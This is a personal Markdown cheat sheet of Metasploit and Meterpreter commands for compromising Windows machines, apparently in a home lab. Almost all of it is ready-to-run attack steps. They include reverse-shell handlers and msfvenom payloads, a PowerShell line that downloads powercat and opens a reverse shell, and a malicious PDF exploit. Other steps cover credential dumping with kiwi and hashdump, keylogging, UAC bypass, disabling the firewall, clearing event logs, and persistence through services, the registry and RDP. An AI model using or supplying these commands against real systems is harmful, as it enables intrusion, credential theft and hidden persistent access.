

# Mestaploit Stager Step by Step

## 1/ MSF Listen tcp handler

msfconsole
use multi/handler
options
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 192.168.56.1
set LPORT 6969
run -j

jobs
echo Trigger reverse shell on victim

sessions

## 2/ Meterpreter Survive

migrate -N gvim.exe
sessions -u 1

## 3/ Meterpreter Loot

sysinfo
getuid
getpid
ps
run post/windows/gather/win_privs
route
run post/windows/gather/enum_logged_on_users

echo "Same as getprivs"

## 4/ Meterpreter Persist

search platform:windows persist


```ps1
IEX(New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/rexpository/powercat-v2.0/main/powercat.ps1');
powerrcatt -c 192.168.56.1 -p 6969 -e powershell
```

set payload windows/shell_reverse_tcp


## 5/ Meterpreter Inject reflective dll (Payload)

use windows/manage/reflective_dll_inject
options
set PROCESS notepad.exe
set PATH ~/Software/C/DreamStager/archive/reflective_dll_stephenfewer.x64.dll
set PATH ~/Software/C/DreamStager/archive/reflective_dll_dreamlab.x64.dll
set session 4
run

## 7/ Meterpreter Search escalation (winpeas)

get_system
run post/multi/recon/local_exploit_suggester

upload ~/Iso/Pentest/winPEAS_dotfuscated.exe C:/Users/User/Downloads
shell
C:/Users/User/Downloads/winPEAS_dotfuscated.exe -h

search platform:windows adduser

## 8/ Meterpreter Loot System

load kiwi
help kiwi
kiwi_cmd version
creds_all

hashdump
run post/windows/gather/hashdump
run post/windows/gather/credentials/sso   

## 9/ Meterpreter Persist System


use exploit/windows/local/persistence_service
set payload windows/meterpreter/reverse_tcp
set session 2
exploit


use post/windows/manage/enable_rdp
options
set username user2
set password password
set session 2
run

echo call remmina app


# Enhanced metasploit: Generate payloads

## 1/ MSF Generate exploit stage1 PDF

reload ~/.msf4/modules/exploits/windows/adobe_reader_reset_form_rce.rb
use exploit/windows/adobe_reader_reset_form_rce
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 192.168.56.1
set LPORT 6969
run


## 2/ MSF Generate payload from C local

reload ~/.msf4/modules/payloads/singles/windows/dll_messagebox.rb
use payload/windows/dll_messagebox
options
generate


# Resource Mfsvenom


msfvenom -p windows/meterpreter/reverse_https -f exe LHOST=192.168.56.1 LPORT=6969 > metasploit_https.exe

use multi/handler
set PAYLOAD windows/meterpreter/reverse_https

# Resource Meterpreter

Ref: https://www.scaler.com/topics/cyber-security/meterpreter-command-cheatsheet/
Load: https://docs.metasploit.com/docs/using-metasploit/intermediate/how-to-use-plugins.html

load -l

### Meterpreter survive

ps -U User
migrate -N Explorer.exe

1. svchost.exe
2. RuntimeBroker.exe
3. dllhost.exe

1. Explorer.exe
2. OneDrive.exe
3. msedge.exe


execute -H -k -f cmd -a "/c netsh firewall set opmode mode=disable"

### NX

bcdedit.exe /set (current) nx AlwaysOff.
or error 0xc0000005

### Meterpreter hide

clearev

### Meterpreter elevate

getsystem
psexec -i -s cmd.exe

use exploit/windows/local/bypassuac

### Meterpreter persist

echo "This is detected"
use exploit/windows/local/registry_persistence 
set payload windows/meterpreter/reverse_https


### Meterpreter Script

irb  # for Interactive Ruby Shell

sys
p = sys.process.execute('calc.exe')

### Meterpreter Loot

keyscan_start
keyscan_dump


#### Admin

> Change password
shell
net user User password2

# Resource Metasploit and Bash

msfconsole
py3 unicorn.py windows/meterpreter/reverse_https 192.168.1.56 6970

Ref: https://github.com/trustedsec/unicorn

### Command line

vim ~/.msf4/logs/framework.log

### Msf IRB Dump

Msf::Ui::Console::CommandDispatcher::
dl = Msf::Ui::Console::CommandDispatcher::Dreamlab.new
Metasm::WindowsExports::EXPORT

### Msfconsole base

?
help
loadpath ~/.msf4/modules/
reload ~/.msf4/modules/payloads/stages/windows/bin_meterpreter_1000.rb


### Command line

/usr/bin/msfconsole
/opt/metasploit-framework/embedded/framework/msfconsole
/opt/metasploit-framework/embedded/framework/lib/metasploit/framework/command/console.rb
/opt/metasploit-framework/embedded/framework/lib/msf/ui/console/driver.rb
  <= Register the commands
/opt/metasploit-framework/embedded/framework/lib/msf/ui/console/command_dispatcher/jobs.rb

* [file: block_reverse_tcp.asm](file:/opt/metasploit-framework/embedded/framework/external/source/shellcode/windows/x64/src/block/block_reverse_tcp.asm)
* [file: block_api.asm](file:/opt/metasploit-framework/embedded/framework/external/source/shellcode/windows/x64/src/block/block_api.asm)
* [file: stager_reverse_tcp.asm](file:/opt/metasploit-framework/embedded/framework/external/source/shellcode/windows/x64/src/stager/stager_reverse_tcp_nx.asm)

lib/msf_autoload.rb
[lib msf core payload windows x64 meterpreter_loader_x64 rb](./lib/msf/core/payload/windows/x64/meterpreter_loader_x64.rb.md)

modules/payloads/stages/windows/x64/meterpreter.rb

ls [opt metasploit framework embedded framework scripts meterpreter](/opt/metasploit-framework/embedded/framework/scripts/meterpreter.md)
msfvenom -p windows/meterpreter/reverse_tcp -a x86 LHOST=192.168.56.1 LPORT=6969 > metasploit_tcp.bin


set LHOST 192.168.56.1
set LPORT 6969
sessions -i 1
jobs -k 5
use 0
